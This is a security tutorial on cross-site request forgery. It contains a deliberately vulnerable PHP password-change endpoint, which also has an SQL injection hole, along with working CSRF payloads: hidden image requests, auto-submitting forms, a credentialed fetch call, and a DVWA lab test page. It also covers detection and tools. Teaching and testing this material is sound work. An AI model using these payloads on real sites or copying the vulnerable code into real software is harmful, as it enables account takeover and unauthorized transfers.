# CSRF (Cross-Site Request Forgery)

## What is CSRF?

CSRF is an attack that forces authenticated users to execute unwanted actions on a web application where they're currently authenticated. The attacker tricks the victim's browser into sending malicious requests using the victim's credentials.

## How CSRF Works

1. **Victim logs into vulnerable site** (e.g., bank.com)
2. **Session established**: Browser stores authentication cookie
3. **Victim visits malicious site** (e.g., evil.com)
4. **Malicious request triggered**: evil.com contains hidden request to bank.com
5. **Browser automatically includes cookies**: Request appears legitimate
6. **Action executed**: Unwanted action performed with victim's privileges

## CSRF Attack Example

### Vulnerable Application

**PHP Code**:
```php
// Password change endpoint (VULNERABLE)
<?php
if ($_GET['password']) {
    $user_id = $_SESSION['user_id'];
    $new_password = $_GET['password'];
    
    // Update password (no CSRF protection!)
    $sql = "UPDATE users SET password='$new_password' WHERE id=$user_id";
    mysqli_query($conn, $sql);
    
    echo "Password changed successfully!";
}
?>
```

### Malicious Website

**evil.com page**:
```html
<!DOCTYPE html>
<html>
<body>
    <h1>Free Prize!</h1>
    
    <!-- Hidden CSRF attack -->
    <img src="http://vulnerable-bank.com/transfer?amount=1000&to=attacker" 
         style="display:none">
    
    <!-- Or using form auto-submit -->
    <form id="csrf" action="http://vulnerable-bank.com/password" method="POST">
        <input type="hidden" name="password" value="hacked123">
    </form>
    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

## Attack Vectors

### 1. GET Request Attack
```html
<img src="http://bank.com/transfer?amount=1000&to=attacker">
<iframe src="http://bank.com/delete-account">
<link rel="prefetch" href="http://site.com/action">
```

### 2. POST Request Attack
```html
<form action="http://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker">
</form>
<script>
    document.getElementById('csrf').submit();
</script>
```

### 3. AJAX Request
```javascript
fetch('http://vulnerable-site.com/api/delete', {
    method: 'POST',
    credentials: 'include', // Include cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({id: 123})
});
```

## Testing for CSRF in DVWA

1. Navigate to "CSRF" section
2. Set security level to "Low"
3. Note the password change URL
4. Create malicious HTML page
5. Test if password changes without explicit user action

**Test Steps**:
```html
<!-- Save as test.html and open in browser -->
<html>
<body>
    <h1>Click to win!</h1>
    <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="hacked">
        <input type="hidden" name="password_conf" value="hacked">
        <input type="hidden" name="Change" value="Change">
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

## Real-World Impact

### Examples:
- **2008 - YouTube**: CSRF vulnerability allowed unauthorized actions on user accounts
- **2011 - ING Direct**: CSRF allowed unauthorized money transfers
- **Netflix**: CSRF vulnerability could add attacker to victim's account

### Potential Damages:
- Unauthorized money transfers
- Account settings modification
- Password changes
- Data deletion
- Malicious posts/comments
- Privilege escalation

## Detection Methods

1. **Check for Anti-CSRF Tokens**
   - Inspect forms and AJAX requests
   - Look for tokens in hidden fields or headers
   - Test if tokens are validated

2. **Test State-Changing Operations**
   - Password change
   - Email change
   - Money transfer
   - Account deletion
   - Settings modification

3. **Analyze HTTP Methods**
   - Check if GET requests perform state changes (bad practice)
   - Test if POST requests require CSRF protection

4. **Cookie Inspection**
   - Check SameSite attribute
   - Verify cookie configuration

## CSRF vs XSS

| CSRF | XSS |
|------|-----|
| Forces unwanted actions | Executes malicious scripts |
| Requires authentication | Works on any user |
| Uses victim's credentials | Steals credentials |
| State-changing operations | Data theft, session hijacking |

## Prevention

See `token-protection.md` for comprehensive CSRF prevention techniques.

## Tools

- **Burp Suite**: CSRF PoC generator
- **OWASP ZAP**: CSRF detection
- **Manual Testing**: Custom HTML pages

## References

- OWASP CSRF Guide
- PortSwigger CSRF Tutorial
- CWE-352: Cross-Site Request Forgery
